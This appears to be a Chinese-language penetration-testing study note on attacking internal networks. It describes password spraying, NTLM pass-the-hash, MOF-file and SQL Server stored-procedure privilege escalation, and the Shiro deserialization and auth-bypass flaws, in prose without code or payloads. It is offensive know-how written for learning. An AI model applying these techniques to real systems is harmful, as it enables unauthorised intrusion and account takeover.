内网漏洞利用

在内网中一般资产的数量是十分庞大的，所以避免迷失攻击的方向，需要有针对性的对内网的资产进行漏洞利用。

而前面所学的信息收集可以为内网漏洞的利用提供有力的条件支撑，利用这些漏洞是取得重要战果和定位靶标的关键。

口令问题

弱口令/规律口令

一般来说弱口令是存在比较多的场景上的，在内网环境中也不乏有些弱口令或者说规律口令的发生

比如一般企业也会直接运用企业名或者缩写凭借简单的数字字符对其服务器进行设密，这些都是十分常见的

口令复用

在内网环境之中口令复用也是比较常见的，不同主机之间可能会运用相同的密码口令，我们可以利用一些手段或者工具对其进行探测，比如密码喷洒等，这样既不会造成次数过多锁定，也可以有效的探测内网环境。

hash传递

再Windows主机中，也可以利用手段获取一些主机的NTLM hash值，可以直接利用这些hash去获取到一些主机的权限

Web/数据库/主机

在通过上一步的口令爆破之后，就可能可以拿到一些服务器的主机权限，就可以对其进行进一步的利用

数据库权限

MSSQL、Oracle、Redis、Postgresql

如果获取到的是这些权限较低的数据库权限，我们就可以考虑对数据库进行提权的操作，进一步获取到主机/系统权限

MOF提权

MOF是windows系统的一个文件，位于c:/windows/system32/wbem/mof/nullevt.mof，他的中文名叫托管对象格式，作用是每五秒回去监控进程的创建和死亡

mof提权的主要原理就是拿到mysql权限之后，我们可以上传我们自己编写的mof文件并且执行，在上传过段时间之后mof就会被执行，其中有一段是vbs脚本，一般作用是利用cmd添加管理员的命令

所以这个提权方法并不局限于MySQL数据库，MySQL只是提供一个让我们在mof目录写入一个我们自己的文件的桥梁，其他能提供同样条件的也可以造成mof提权

SQLServer数据库

SQL server提权主要依赖于自带的存储过程

而存储过程就是一个可编程的函数，他在数据库中创建并且保存，是存储在服务器中的一组编译过的T-SQL语句，我们可以将存储过程认为是函数调用过程，可以使用execute命令执行存储过程

主要分为系统存储过程，扩展存储过程，用户定义的存储过程

存储过程主要存储在master数据库中，以sp_为前缀，在任何数据库中都可以调用

扩展存储过程中主要是对动态链接库的（dll）函数调用，主要用于客户端于服务器端 或者客户端之间进行通信，以xp_为前缀

Shiro

框架是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理

他是基于cookie的反序列化漏洞，最具特征的是在返回包中会存在Rememberme=deleteme

具有

550

原理：cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理

可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令

721

原理：RememberMe Cookie 默认通过 AES-128-CBC 模式加密，这种加密容易受到攻击，攻击者可以使用有效的 RememberMe Cookie 作为 Paddding Oracle Attack 的前缀，精心构造 RememberMe Cookie 来实施反序列化攻击

682

但是682这个比较少见

原理：利用的是 shiro 和 spring 对 url 中的 “;” 处理差别来绕过校验
